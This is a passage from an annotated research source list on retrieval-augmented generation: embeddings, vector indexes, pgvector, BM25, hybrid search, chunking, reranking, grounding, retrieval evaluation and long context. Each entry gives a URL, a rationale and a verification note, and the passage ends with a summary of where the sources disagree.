- **Dates on the .txt rebuttal and the 12-factor doc** aren't shown on the pages. Record them as undated, or look at the repo or blog commit history before citing.

## Phase 2: Retrieval

Every source below was opened with WebFetch on 2026-09-23. Two primaries could not be verified: the RRF paper and the BM25 monograph. Both PDFs came back as binary, and the publisher pages returned 403 (details under "Couldn't open").

### cosine-similarity (short)
1. **Vector embeddings (guide)** by OpenAI, undated, checked 2026-09-23
   https://developers.openai.com/api/docs/guides/embeddings
   kind: docs · primary: yes
   Why: The practical rule. "We recommend cosine similarity. The choice of distance function typically doesn't matter much." OpenAI vectors are normalized to length 1, so a dot product gives the same result.
   Checked: The page loads (the old platform.openai.com URL redirects here). It lists text-embedding-3-small/large and ada-002, and its MTEB scores are from the 2024 generation.
2. **Measuring similarity from embeddings** by Google ML Crash Course, updated 2025-08-25
   https://developers.google.com/machine-learning/clustering/dnn-clustering/supervised-similarity
   kind: docs · primary: no
   Why: Shows that Euclidean distance, cosine and dot product agree once vectors are normalized, and that dot product also counts vector length ("popularity").
   Checked: Current.
3. **Is Cosine-Similarity of Embeddings Really About Similarity?** by Steck, Ekanadham, Kallus (Netflix), 2024-03 (WWW '24 Companion)
   https://arxiv.org/abs/2403.05440
   kind: paper · primary: yes
   Why: The counterpoint. Cosine "can yield arbitrary and therefore meaningless 'similarities'" in some learned embeddings.
   Checked: The abstract matches this claim. The analysis is on regularized linear models, so it doesn't carry over directly to API embeddings.
Also serves: semantic-search, embedding-models

### embedding-models (short)
1. **MMTEB: Massive Multilingual Text Embedding Benchmark** by Enevoldsen et al., 2025-02-19 (v 2025-11-13, ICLR 2025)
   https://arxiv.org/abs/2502.13595
   kind: paper · primary: yes
   Why: The current version of the benchmark behind the leaderboard: 500+ tasks, and a 560M-parameter model beats much larger ones.
   Checked: It replaces the original MTEB paper (arXiv 2210.07316, last revised 2023-03). Cite the original only for history.
2. **Generative Benchmarking** by Hong, Troynikov, Huber (Chroma) and McGuire (W&B), 2025-04-07
   https://www.trychroma.com/research/generative-benchmarking
   kind: blog (technical report) · primary: yes
   Why: Direct evidence for "benchmark vs my own data." jina-embeddings-v3 beats text-embedding-3-large on MTEB but loses on W&B's real data.
   Checked: The page loads (research.trychroma.com redirects here). It also describes a way to generate eval queries from your own documents.
3. **Text Embeddings** by Voyage AI, updated Aug 2026
   https://docs.voyageai.com/docs/embeddings
   kind: docs · primary: yes
   Why: Shows the knobs you actually pick: voyage-4 family, 32K context, Matryoshka dimensions (256/512/1024/2048), int8/binary output, and `input_type` query vs document.
   Checked: Current (voyage-4 generation). It doesn't say whether outputs are normalized.
4. **Matryoshka Representation Learning** by Kusupati et al., 2022-05 (rev 2024-02, NeurIPS 2022)
   https://arxiv.org/abs/2205.13147
   kind: paper · primary: yes
   Why: Explains why shortened dimensions still work: up to 14x smaller embeddings at the same accuracy (their ImageNet results).
   Checked: The abstract matches. The numbers are mostly from vision tasks.
Also serves: cosine-similarity (OpenAI #1 covers the `dimensions` parameter), retrieval-evaluation (#2), pgvector (#3 quantization)

### semantic-search (deep)
1. **Dense Passage Retrieval for Open-Domain QA** by Karpukhin et al., 2020-04 (EMNLP 2020)
   https://arxiv.org/abs/2004.04906
   kind: paper · primary: yes
   Why: The paper that showed dense retrieval works. It beats Lucene-BM25 "by 9%-19% absolute" in top-20 passage accuracy.
   Checked: The abstract matches. It's an old architecture, but still the reference result.
2. **Semantic Search** by Sentence Transformers (sbert.net), current docs, checked 2026-09-23
   https://sbert.net/examples/sentence_transformer/applications/semantic-search/README.html
   kind: docs · primary: yes
   Why: The mechanism in three steps (embed corpus, embed query, nearest by cosine), plus the symmetric vs asymmetric search split that decides which model to use.
   Checked: The current API is used (`encode_query`/`encode_document`).
3. **BEIR: zero-shot IR benchmark** by Thakur, Reimers et al., 2021-04 (NeurIPS 2021 Datasets)
   https://arxiv.org/abs/2104.08663
   kind: paper · primary: yes
   Why: The counterweight to DPR. Out of domain, "BM25 is a robust baseline" and dense models "often underperform."
   Checked: The abstract matches. The models are from 2021, but the finding still motivates hybrid search.
4. See cosine-similarity #1 (OpenAI embeddings guide): the API-side view of embedding and comparing.
5. **Vector Search Explained** by Victoria Slocum (Weaviate), 2024-11-21
   https://weaviate.io/blog/vector-search-explained
   kind: blog · primary: no
   Why: A plain explainer of kNN vs ANN with a worked cost example (300 dims x 10M vectors = 3 billion operations).
   Checked: The page loads and is dated.
Also serves: bm25, hybrid-search, vector-index, reranking (#2 has a retrieve-and-rerank section)

### vector-index (deep)
1. **The Faiss library** by Douze, Jégou et al. (Meta), 2024-01-16 (v4 2025-10-23)
   https://arxiv.org/abs/2401.08281
   kind: paper · primary: yes
   Why: A primary overview of "the trade-off space of vector search": speed vs memory vs accuracy, and the index families (flat, IVF, graph, quantization).
   Checked: Current. It replaces the 2017 GPU Faiss paper as the general reference.
2. See semantic-search #5 (Weaviate): why brute force is O(n), and the four ANN families (tree, graph, clustering, hashing).
3. **ANN-Benchmarks** by Erik Bernhardsson et al., results last updated Apr 2025
   https://github.com/erikbern/ann-benchmarks (results at https://ann-benchmarks.com/)
   kind: code · primary: yes
   Why: The standard recall vs queries-per-second plots. pgvector and hnswlib are both included.
   Checked: The README says it is "no longer actively maintained" and points to VIBE. Use it to show the trade-off curve, not for current rankings.
4. **An In-Depth Study of Filter-Agnostic Vector Search on a PostgreSQL Database System** by Lu, Caminal, Papakonstantinou et al. (Google), SIGMOD 2026
   https://arxiv.org/abs/2603.23710
   kind: paper · primary: yes
   Why: Shows what the index costs inside a real database. With filters, graph indexes "can incur prohibitive numbers of filter checks" compared with clustering indexes.
   Checked: A recent study inside PostgreSQL, but it tests other indexes (ScaNN, NaviX, ACORN) rather than pgvector's HNSW directly.
Also serves: hnsw, pgvector

### hnsw (deep)
1. **Efficient and robust ANN search using HNSW graphs** by Malkov & Yashunin, 2016-03 (v4 2018-08; later in IEEE TPAMI)
   https://arxiv.org/abs/1603.09320
   kind: paper · primary: yes
   Why: The original: layers assigned with exponentially decaying probability, and "logarithmic complexity scaling."
   Checked: The abstract matches. The algorithm hasn't been replaced.
2. **hnswlib ALGO_PARAMS.md** by nmslib (the paper authors' library), undated, checked 2026-09-23
   https://github.com/nmslib/hnswlib/blob/master/ALGO_PARAMS.md
   kind: code/docs · primary: yes
   Why: The tuning guide from the builders: M=12–48 for most uses and 48–64 for embeddings, memory of about M*8–10 bytes per element, ef ≥ k, and raise ef_construction if recall is below 0.9.
   Checked: The page loads and matches.
3. **Hierarchical Navigable Small Worlds (HNSW)** by Pinecone (Faiss series), author and date not shown
   https://www.pinecone.io/learn/series/faiss/hnsw/
   kind: blog · primary: no
   Why: The best visual explainer, building skip lists → NSW → HNSW, with measured recall and latency (about 1ms at 80% recall to 50ms at 100%) and index memory growing with M.
   Checked: The page loads with no author or date shown. It uses Faiss, not pgvector.
4. **HNSW indexes (Supabase docs)** by Supabase, undated, checked 2026-09-23
   https://supabase.com/docs/guides/ai/vector-indexes/hnsw-indexes
   kind: docs · primary: no
   Why: The practical choice: "HNSW should be your default," and unlike IVFFlat it's safe to build on an empty table.
   Checked: Current. It mentions iterative scans from pgvector 0.8.0.
Also serves: vector-index, pgvector

### pgvector (short)
1. **pgvector README** by Andrew Kane et al., v0.8.6 (2026-07-29), checked 2026-09-23
   https://github.com/pgvector/pgvector
   kind: code/docs · primary: yes
   Why: The source of truth: HNSW and IVFFlat parameters, operators (`<=>` is cosine distance), 2,000-dimension limit for indexed `vector` (4,000 for halfvec), post-index filtering, and iterative scans.
   Checked: Latest release 0.8.6 (CHANGELOG, 2026-07-29).
2. **Scalar and binary quantization for pgvector** by Jonathan Katz, 2024-04-09
   https://jkatz05.com/post/postgres/pgvector-scalar-binary-quantization/
   kind: blog · primary: yes (pgvector contributor)
   Why: Measured limits and workarounds. halfvec keeps "nearly identical" recall at up to 3x less space, while binary quantization needs reranking or recall collapses.
   Checked: Written against pgvector 0.7, still valid for halfvec and bit types. Pair with #3 for 0.8 changes.
3. **pgvector 0.8.0 Released** by PostgreSQL.org news, 2024-11-11
   https://www.postgresql.org/about/news/pgvector-080-released-2952/
   kind: docs (release notes) · primary: yes
   Why: Fixes "overfiltering" (a WHERE clause returning too few rows) with iterative index scans, plus better planner costs for filtered queries.
   Checked: Still the latest minor line (0.8.x).
Also serves: hnsw, hybrid-search (#1 has a hybrid section), vector-index

### bm25 (short)
1. **Practical BM25 Part 2: The BM25 algorithm and its variables** by Shane Connelly (Elastic), 2018-04-19
   https://www.elastic.co/blog/practical-bm25-part-2-the-bm25-algorithm-and-its-variables
   kind: blog · primary: yes (Elastic ships BM25 as its default)
   Why: Clear walk through IDF, k1 (saturation, default 1.2) and b (length normalization, default 0.75).
   Checked: Old, but the formula hasn't changed. This is a stand-in because I couldn't verify Robertson & Zaragoza (see "Couldn't open").
2. **Introducing pg_textsearch: true BM25 ranking in Postgres** by Todd J. Green & Matvey Arye (Tiger Data), 2025-10-23
   https://www.tigerdata.com/blog/introducing-pg_textsearch-true-bm25-ranking-hybrid-retrieval-postgres
   kind: blog · primary: yes (the extension's builders)
   Why: Matters for this build: Postgres `ts_rank` has no IDF, no saturation and no length normalization, so it isn't BM25.
   Checked: The extension repo (https://github.com/timescale/pg_textsearch) is at v1.4.0 and supports PG 17/18. Limits: no phrase queries, and IDF is per partition. This is a vendor post, so weigh its speed claims against ParadeDB.
3. **Controlling Text Search (ranking)** by PostgreSQL docs, current
   https://www.postgresql.org/docs/current/textsearch-controls.html
   kind: docs · primary: yes
   Why: The primary confirmation: "the ranking functions do not use any global information."
   Checked: Current docs.
Also serves: hybrid-search, pgvector, semantic-search (see semantic-search #3, BEIR, for "still hard to beat")

### hybrid-search (deep)
1. **An Analysis of Fusion Functions for Hybrid Retrieval** by Bruch, Gai, Ingber (Pinecone), 2022-10 (rev 2023-05; ACM TOIS)
   https://arxiv.org/abs/2210.11934
   kind: paper · primary: yes
   Why: The main research on how to merge. Convex (linear) combination beats RRF in and out of domain, RRF is "sensitive to its parameters," and a small labeled set is enough to tune.
   Checked: The abstract matches.
2. **Hybrid Search in Qdrant** by Dylan Couzon (Qdrant), 2026-08-24
   https://qdrant.tech/articles/hybrid-search/
   kind: blog · primary: yes
   Why: Numbers and the scale problem. BM25 scores swing from about 20 to 80 while dense scores sit at 0.6–0.9. Fused hybrid beat the stronger single retriever on 4 of 5 datasets (about +5–16% nDCG@10). "Start with RRF."
   Checked: Very recent.
3. **Hybrid search fusion algorithms** by Dirk Kulawiak & JP Hwang (Weaviate), 2023-08-29
   https://weaviate.io/blog/hybrid-search-fusion-algorithms
   kind: blog · primary: yes
   Why: A real design choice with a number. Weaviate switched its default from rank fusion to relativeScoreFusion in v1.24 because it showed "~6% improvement in recall."
   Checked: 2023, but the default it describes is still current (their 2025 explainer says the same).
4. **Linear retriever for hybrid search** by Panagiotis Bailis (Elastic), 2025-05-28
   https://www.elastic.co/search-labs/blog/linear-retriever-hybrid-search
   kind: blog · primary: yes
   Why: When to use linear combination (score size matters, you can tune weights) vs RRF (simple, no tuning).
   Checked: Current. It has a worked example only, no benchmark.
5. **Hybrid search (Supabase docs)** by Supabase, undated, checked 2026-09-23
   https://supabase.com/docs/guides/ai/hybrid-search
   kind: docs · primary: no
   Why: A complete Postgres SQL function for the exact stack being built (tsvector + pgvector + RRF with weights).
   Checked: Uses k=50 by default and Postgres full-text search, not BM25.
Also serves: reciprocal-rank-fusion, bm25, pgvector (see also pgvector #1 hybrid section, bm25 #2)

### reciprocal-rank-fusion (short)
1. **Reciprocal rank fusion (Elasticsearch reference)** by Elastic, current, checked 2026-09-23
   https://www.elastic.co/docs/reference/elasticsearch/rest-apis/reciprocal-rank-fusion
   kind: docs · primary: yes
   Why: The formula `score += 1/(k + rank)`, `rank_constant` default 60, and a link to the Cormack paper.
   Checked: GA in the current Elastic Stack.
2. **pgvector-python hybrid search RRF example** by pgvector (Andrew Kane), checked 2026-09-23
   https://github.com/pgvector/pgvector-python/blob/master/examples/hybrid_search/rrf.py
   kind: code · primary: yes
   Why: RRF in one SQL query with two CTEs (`<=>` top 20 and `ts_rank_cd` top 20) and k=60. Directly reusable.
   Checked: The page loads and matches.
3. See hybrid-search #1 (Bruch et al.): evidence that RRF's k does matter.
Also serves: hybrid-search. The original Cormack, Clarke & Büttcher paper (SIGIR 2009) is not verified, see "Couldn't open."

### chunking (deep)
1. **Evaluating Chunking Strategies for Retrieval** by Brandon Smith & Anton Troynikov (Chroma), 2024-07-03
   https://www.trychroma.com/research/evaluating-chunking
   kind: blog (technical report) · primary: yes
   Why: The best measurements. Token-level recall, precision and IoU; RecursiveCharacterTextSplitter at 200 tokens with no overlap is consistently good; OpenAI's 800/400 default gets "the lowest scores across all other metrics."
   Checked: The page loads (redirected from research.trychroma.com). Strategies differ by up to 9% in recall.
2. **Finding the Best Chunking Strategy for Accurate AI Responses** by Steve Han (NVIDIA), 2025-06-18
   https://developer.nvidia.com/blog/finding-the-best-chunking-strategy-for-accurate-ai-responses/
   kind: blog · primary: yes
   Why: A different measurement (end-to-end answer accuracy on 5 PDF datasets). Page-level chunking wins (0.648, lowest variance), 128 and 2,048 tokens are worst, and the best size depends on the query type.
   Checked: Recent. The datasets are PDFs, not Markdown articles.
3. **Contextual Retrieval** by Anthropic, 2024-09-19
   https://www.anthropic.com/engineering/contextual-retrieval
   kind: blog · primary: yes
   Why: Chunks lose their context, and adding 50–100 tokens of generated context per chunk cuts retrieval failures 35% (embeddings only), 49% (+ contextual BM25) and 67% (+ reranking). Cost is $1.02 per million document tokens with caching.
   Checked: /news/contextual-retrieval serves the same article. It uses Claude 3 Haiku, an old model, but the method holds.
4. **Is Semantic Chunking Worth the Computational Cost?** by Qu, Tu, Bao, 2024-10-16
   https://arxiv.org/abs/2410.13070
   kind: paper · primary: yes
   Why: The skeptic: semantic chunking's costs "are not justified by consistent performance gains."
   Checked: The abstract matches.
5. **File search / vector store defaults** by OpenAI, current
   https://developers.openai.com/api/docs/guides/retrieval
   kind: docs · primary: yes
   Why: The common default everyone compares against: 800-token chunks with 400 overlap, chunk size configurable from 100 to 4,096.
   Checked: Current.
6. **Late Chunking** by Günther et al. (Jina AI), 2024-09 (v 2025-07)
   https://arxiv.org/abs/2409.04701
   kind: paper · primary: yes
   Why: A different fix for lost chunk context: embed the whole document, then split before pooling. Optional.
   Checked: The abstract matches.
Also serves: rag, retrieval-evaluation (#1 metrics), context-engineering. Secondary option: Pinecone "Chunking Strategies" (Schwaber-Cohen & Patel, 2025-06-28, https://www.pinecone.io/learn/chunking-strategies/), which says "start with fixed-size."

### reranking (deep)
1. **Passage Re-ranking with BERT** by Nogueira & Cho, 2019-01 (rev 2020-04)
   https://arxiv.org/abs/1901.04085
   kind: paper · primary: yes
   Why: The original cross-encoder reranking result: +27% relative MRR@10 on MS MARCO.
   Checked: The abstract matches. Historical, but the mechanism is the same.
2. **Cross-Encoder vs Bi-Encoder / Retrieve & Re-Rank** by Sentence Transformers, current
   https://www.sbert.net/examples/cross_encoder/applications/README.html
   kind: docs · primary: yes
   Why: The cost argument in numbers: clustering 10k sentences takes about 65 hours with a cross-encoder vs 5 seconds with a bi-encoder, hence retrieve 100 and then rerank.
   Checked: Current. The pretrained list (https://www.sbert.net/docs/cross_encoder/pretrained_models.html) gives ms-marco-MiniLM-L6-v2 at 74.30 NDCG@10 and 1,800 docs/sec, useful for a local reranker.
3. **Rerankers (Voyage docs)** by Voyage AI, updated 2026-09-01
   https://docs.voyageai.com/docs/reranker
   kind: docs · primary: yes
   Why: Current hosted rerankers: rerank-2.5 is stable, rerank-3 is in preview, 32K context, `top_k`.
   Checked: Very recent. The page doesn't show pricing.
4. **Rerankers and Two-Stage Retrieval** by Pinecone, author and date not shown
   https://www.pinecone.io/learn/series/rag/rerankers/
   kind: blog · primary: no
   Why: Explains why you can't just retrieve more: "LLM recall degrades as we put more tokens in the context window." Its worked example moves a chunk from position 23 to 1.
   Checked: The page loads with no byline or date.
5. See chunking #3 (Contextual Retrieval): reranking took failures from 49% to 67% fewer, with top-20 retrieval.
Also serves: hybrid-search, rag, context-engineering

### rag (deep)
1. **Retrieval-Augmented Generation for Knowledge-Intensive NLP Tasks** by Lewis et al. (FAIR), 2020-05 (v4 2021-04, NeurIPS 2020)
   https://arxiv.org/abs/2005.11401
   kind: paper · primary: yes
   Why: The origin of the term. It combines "parametric" (model weights) and "non-parametric" (retrieved text) memory.
   Checked: The abstract matches. Note that the paper trains the retriever and generator together, while today's API RAG only calls a frozen model. Worth saying in the article.
2. **Seven Failure Points When Engineering a RAG System** by Barnett et al., 2024-01-11
   https://arxiv.org/abs/2401.05856 (HTML: https://arxiv.org/html/2401.05856)
   kind: paper · primary: yes
   Why: A practical map of where RAG breaks: missing content, missed top-k, not in context, not extracted, wrong format, wrong specificity, incomplete.
   Checked: Opened the HTML and saw all seven listed.
3. See chunking #3 (Contextual Retrieval): the modern pipeline end to end, and "under 200,000 tokens, just include the entire knowledge base."
4. **Long Context RAG Performance of LLMs** by Leng, Portes, Havens, Zaharia, Carbin (Databricks), 2024-08-12
   https://www.databricks.com/blog/long-context-rag-performance-llms
   kind: blog · primary: yes
   Why: 2,000+ experiments on how much retrieved context helps. Gains from 2k to 16–32k tokens, then most models drop.
   Checked: The models are from 2024 (GPT-4o, Claude 3.5), so newer models may hold up longer.
5. See semantic-search #1 (DPR): the retriever half.
Also serves: long-context, chunking, grounding, retrieval-evaluation (#2)

### grounding (deep)
1. **Citations (Claude API docs)** by Anthropic, current, checked 2026-09-23
   https://platform.claude.com/docs/en/build-with-claude/citations
   kind: docs · primary: yes
   Why: Grounding as an API feature. Documents are split into sentences and the response returns exact cited passages.
   Checked: GA on all active models. The page was too long for the fetch tool, so I only saw the opening section. Re-open it before writing notes.
2. **Introducing Citations on the Anthropic API** by Anthropic, 2025-01 (claude.com/blog)
   https://claude.com/blog/introducing-citations-api
   kind: blog · primary: yes
   Why: Claims built-in citations raise recall accuracy "by up to 15%" over custom setups, and that Endex cut source hallucinations "from 10% to 0%."
   Checked: The page loads (redirected from anthropic.com/news). These are vendor claims, so label them that way.
3. **Enabling LLMs to Generate Text with Citations (ALCE)** by Gao, Yen, Yu, Chen (Princeton), 2023-05 (EMNLP 2023)
   https://arxiv.org/abs/2305.14627
   kind: paper · primary: yes
   Why: The measurement view: on ELI5 "even the best models lack complete citation support 50% of the time," plus metrics for citation recall and precision.
   Checked: The abstract matches. The models are from 2023.
4. **FACTS Grounding** by Google DeepMind FACTS team, 2024-12-17
   https://deepmind.google/discover/blog/facts-grounding-a-new-benchmark-for-evaluating-the-factuality-of-large-language-models/
   kind: blog (benchmark) · primary: yes
   Why: A working definition of grounded (fully attributable to the given document) and how it's judged (3 LLM judges, docs up to 32k tokens).
   Checked: The page mentions a Dec 2025 "FACTS Benchmark Suite," which may replace this. I didn't open that.
5. **Reduce hallucinations** by Anthropic docs, current
   https://platform.claude.com/docs/en/test-and-evaluate/strengthen-guardrails/reduce-hallucinations
   kind: docs · primary: yes
   Why: Prompt-level grounding: extract quotes first for documents over 20k tokens, retract any claim without a supporting quote, and restrict answers to the provided documents.
   Checked: Current, opened in full.
Also serves: saying-i-dont-know (#5), rag, streaming-ui (citations shown in the UI)

### retrieval-evaluation (deep)
1. **Systematically Improving Your RAG** by Jason Liu, 2024-05-22
   https://jxnl.co/writing/2024/05/22/systematically-improving-your-rag/
   kind: blog · primary: no (practitioner)
   Why: The workflow: generate synthetic questions per chunk and measure retrieval precision and recall first. His numbers: embeddings about 65% vs full-text 55% recall on his data.
   Checked: The page loads.
2. See embedding-models #2 (Chroma Generative Benchmarking): building an eval set from your own documents, and why public benchmark rankings don't carry over.
3. See chunking #1 (Chroma chunking): token-level recall, precision and IoU, a finer way to score retrieval than whole-document hits.
4. See semantic-search #3 (BEIR): how retrieval benchmarks are built (nDCG@10, zero-shot).
5. **Ragas: Automated Evaluation of RAG** by Es, James, Espinosa-Anke, Schockaert, 2023-09 (rev 2025-04, EACL 2024 demo)
   https://arxiv.org/abs/2309.15217
   kind: paper · primary: yes
   Why: The other school: reference-free, LLM-judged metrics (faithfulness, answer relevance, context relevance) with no labels needed.
   Checked: The abstract matches.
6. See rag #2 (Seven Failure Points): FP2 "missed top-ranked documents" is exactly what retrieval eval catches.
Also serves: recall-at-k, mrr, evals nodes in later phases

### recall-at-k (short)
1. **Evaluation of unranked retrieval sets** by Manning, Raghavan, Schütze, Introduction to Information Retrieval (CUP 2008)
   https://nlp.stanford.edu/IR-book/html/htmledition/evaluation-of-unranked-retrieval-sets-1.html
   kind: book · primary: yes
   Why: The textbook definitions. Recall is "the fraction of relevant documents that are retrieved," and you can always get recall 1 by returning everything. The ranked chapter (…/evaluation-of-ranked-retrieval-results-1.html) covers precision@k, MAP and NDCG but not MRR.
   Checked: Old but standard, and the definitions haven't changed.
2. **Evaluation Measures in Information Retrieval** by Laura Carnevali (Pinecone), 2023-06-30
   https://www.pinecone.io/learn/offline-evaluation/
   kind: blog · primary: no
   Why: Recall@K vs MRR vs MAP@K vs NDCG@K side by side, order-aware vs not, with Python code. Spotify used Recall@K plus MRR.
   Checked: The page loads.
Also serves: mrr, retrieval-evaluation

### mrr (short)
1. See recall-at-k #2 (Pinecone): MRR formula, strengths ("rewards early relevant results") and the weakness that it ignores everything after the first hit.
2. **Mean reciprocal rank** by Wikipedia, checked 2026-09-23
   https://en.wikipedia.org/wiki/Mean_reciprocal_rank
   kind: docs (encyclopedia) · primary: no
   Why: A clean worked example (1/3, 1/2, 1 → 0.61) and the origin: Voorhees, TREC-8 QA Track Report (1999/2000).
   Checked: The page loads. It's only here because the Voorhees PDF wouldn't open, see "Couldn't open."
Optional third: Evidently AI, "Mean Reciprocal Rank" (2025-01-09, https://www.evidentlyai.com/ranking-metrics/mean-reciprocal-rank-mrr). It mostly repeats #1.

### context-engineering (deep)
1. **Effective context engineering for AI agents** by Rajasekaran, Dixon, Ryan, Hadfield (Anthropic), 2025-09-29
   https://www.anthropic.com/engineering/effective-context-engineering-for-ai-agents
   kind: blog · primary: yes
   Why: The definition (curating all the tokens a model sees at inference), "context rot," just-in-time retrieval vs retrieving up front, compaction, notes and sub-agents.
   Checked: Current.
2. **How Long Contexts Fail** by Drew Breunig, 2025-06-22
   https://www.dbreunig.com/2025/06/22/how-contexts-fail-and-how-to-fix-them.html
   kind: blog · primary: no
   Why: Four named failure modes (poisoning, distraction, confusion, clash), each with cited evidence (e.g., o3 dropping from 98.1 to 64.1 on sharded prompts).
   Checked: The follow-up **How to Fix Your Context** (2025-06-26, https://www.dbreunig.com/2025/06/26/how-to-fix-your-context.html) lists six fixes with numbers. Use the two together.
3. **Context Engineering** by LangChain team, 2025-07-02
   https://www.langchain.com/blog/context-engineering-for-agents
   kind: blog · primary: no
   Why: A simple way to organize the topic: write, select, compress, isolate.
   Checked: The page loads (redirected from blog.langchain.com).
4. **Context engineering** by Simon Willison, 2025-06-27
   https://simonwillison.net/2025/Jun/27/context-engineering/
   kind: blog · primary: no
   Why: Where the term came from (Lütke, Karpathy) and why it replaced "prompt engineering."
   Checked: The page loads.
5. **Context Rot** by Hong, Troynikov, Huber (Chroma), 2025-07-14
   https://www.trychroma.com/research/context-rot
   kind: blog (technical report) · primary: yes
   Why: The measurements behind "context rot": 18 models, where distractors, how similar the question is to the answer, and haystack structure all matter.
   Checked: The page loads (redirected). The models tested are mid-2025.
Also serves: long-context, lost-in-the-middle, rag

### long-context (deep)
1. **RAG or Long-Context LLMs? A Comprehensive Study and Hybrid Approach** by Li, Li, Zhang, Mei, Bendersky (Google), 2024-07 (EMNLP 2024 industry)
   https://arxiv.org/abs/2407.16833
   kind: paper · primary: yes
   Why: The head-to-head. Long context "consistently outperforms RAG" on average, but RAG is much cheaper, and Self-Route picks per query.
   Checked: The models are Gemini 1.5 and GPT-4 era.
2. **Retrieval meets Long Context LLMs** by Xu, Ping et al. (NVIDIA), 2023-10 (ICLR 2024)
   https://arxiv.org/abs/2310.03025
   kind: paper · primary: yes
   Why: The opposite finding: 4K context plus retrieval ≈ a 16K fine-tuned model, and retrieval helps long-context models too.
   Checked: The abstract matches. The models are Llama 2 era.
3. **RULER: What's the Real Context Size of Your Long-Context LMs?** by Hsieh et al. (NVIDIA), 2024-04 (COLM 2024)
   https://arxiv.org/abs/2404.06654
   kind: paper · primary: yes
   Why: Advertised vs effective context. Near-perfect on simple needle tests, but "only half" hold up at 32K.
   Checked: The abstract matches.
4. **NoLiMa: Long-Context Evaluation Beyond Literal Matching** by Modarressi et al. (Adobe/LMU), 2025-02 (ICML 2025)
   https://arxiv.org/abs/2502.05167
   kind: paper · primary: yes
   Why: Removing word overlap between question and needle makes it much harder. At 32K, 11 models fall below half their short-context score, and GPT-4o drops from 99.3% to 69.7%.
   Checked: The abstract matches.
5. **Long context (Gemini API docs)** by Google, updated 2026-06-22
   https://ai.google.dev/gemini-api/docs/long-context
   kind: docs · primary: yes
   Why: The vendor case for "provide all relevant information upfront," with its limits: about 99% on a single needle but worse with several needles. Also: put the query at the end, and use context caching.
   Checked: Current.
6. See rag #4 (Databricks) and chunking #3 (Anthropic's under-200k-tokens rule).
Also serves: rag, lost-in-the-middle, context-engineering

### lost-in-the-middle (short)
1. **Lost in the Middle: How Language Models Use Long Contexts** by Liu, Lin, Hewitt, Paranjape, Bevilacqua, Petroni, Liang, TACL vol. 12 (2024), pp. 157–173
   https://aclanthology.org/2024.tacl-1.9/ (arXiv: https://arxiv.org/abs/2307.03172, v3 2023-11-20)
   kind: paper · primary: yes
   Why: The original U-shaped curve: performance is best when the relevant text is at the start or end and "significantly degrades" in the middle.
   Checked: Cite the TACL version. The models are 2023; newer models flatten the curve, see #2.
2. See context-engineering #5 (Chroma Context Rot): an update from 2025 models showing it isn't only position. Similarity, distractors and haystack structure also matter.
Also serves: long-context, reranking (why the best chunk goes first)

### streaming-ui (short)
1. **Chatbot (AI SDK UI, useChat)** by Vercel, AI SDK 7.x, checked 2026-09-23
   https://ai-sdk.dev/docs/ai-sdk-ui/chatbot
   kind: docs · primary: yes
   Why: The UI states to design for (`submitted`, `streaming`, `ready`, `error`), `stop` and `regenerate`, and message `parts`, including `source-url`/`source-document` for showing sources.
   Checked: Current. The stream protocol page (https://ai-sdk.dev/docs/ai-sdk-ui/stream-protocol) shows the SSE part types for AI SDK 7.x.
2. **Unterminated Block Parsing (Streamdown)** by Vercel, undated, checked 2026-09-23
   https://streamdown.ai/docs/termination
   kind: docs · primary: yes
   Why: A concrete streaming problem: half-finished Markdown (open `**`, code fences, `[link`) renders badly mid-stream. Explains how remend closes it.
   Checked: The page loads with no version or date.
3. **Less Chat, More Answer** by Rosala, Kenderova, Kohler (NN/g), 2026-04-17
   https://www.nngroup.com/articles/less-chat-more-answer/
   kind: blog (user research) · primary: yes (their study)
   Why: The user side. Streaming a dense answer can make overload worse ("The pouring in of information kind of made me feel overwhelmed").
   Checked: Recent. It doesn't cover loading states.
Also serves: grounding (showing citations), saying-i-dont-know

### saying-i-dont-know (short)
1. **Sufficient Context: A New Lens on RAG Systems** by Joren, Zhang, Ferng, Juan, Taly, Rashtchian (Google), 2024-11 (v 2025-04, ICLR 2025)
   https://arxiv.org/abs/2411.06037
   kind: paper · primary: yes
   Why: Strong models "often output incorrect answers instead of abstaining" when the context isn't enough, and selective generation helps by 2–10%.
   Checked: The Google Research blog (2025-05-14, https://research.google/blog/deeper-insights-into-retrieval-augmented-generation-the-role-of-sufficient-context/) adds that one model's wrong answers rose from 10.2% with no context to 66.1% with insufficient context.
2. See grounding #5 (Anthropic reduce-hallucinations doc): the prompt side ("Allow Claude to say 'I don't know'", the "No relevant quotes found" pattern).
3. **Why Language Models Hallucinate** by Kalai, Nachum, Vempala, Zhang (OpenAI), 2025-09-04
   https://arxiv.org/abs/2509.04664
   kind: paper · primary: yes
   Why: Explains why models guess: grading that rewards any answer over "I don't know."
   Checked: I opened the arXiv abstract; the openai.com blog returned 403.
4. **Explainable AI in Chat Interfaces** by Megan Chan (NN/g), 2025-12-12
   https://www.nngroup.com/articles/explainable-ai/
   kind: blog · primary: yes (their research)
   Why: The UI side: plain-language limitation messages placed near the input, citations next to claims, and a finding that users often never click citations.
   Checked: The page loads.
Also serves: grounding, streaming-ui, rag (Seven Failure Points FP1 "missing content")

### Disagreements and tensions
- **Chunk size.** Chroma: 200 tokens with no overlap works well, and OpenAI's 800/400 default scores lowest on most metrics. NVIDIA: page-level chunks win, 128 and 2,048 tokens lose, and 256–1,024 depends on the query type. The OpenAI docs still ship 800/400. Pinecone: start with fixed-size. They also measure different things (Chroma scores retrieved tokens, NVIDIA scores end-to-end answer accuracy on PDFs), which may explain part of the gap.
- **Semantic chunking.** Chroma's ClusterSemanticChunker had the best precision and IoU. Qu et al. say the extra cost isn't justified by consistent gains.
- **Fusion method.** Elastic, Qdrant ("start with RRF") and pgvector examples use RRF with k=60. Bruch et al. find linear combination beats RRF and that RRF is sensitive to k. Weaviate switched its default away from RRF for about +6% recall. Supabase uses k=50, not 60.
- **Dense vs BM25.** DPR beats BM25 by 9–19 points in domain. BEIR finds BM25 more robust out of domain. Jason Liu measured embeddings at 65% vs full-text at 55% on his own data. This is why the plan says "measure on my own data."
- **"BM25" in Postgres.** The pgvector README and Supabase hybrid example use Postgres full-text search, but `ts_rank` has no IDF (Postgres docs, Tiger Data, ParadeDB). A true-BM25 build needs pg_textsearch (PostgreSQL license, PG 17/18) or ParadeDB pg_search. Tiger Data calls pg_search AGPL; I didn't check that on ParadeDB's own page.
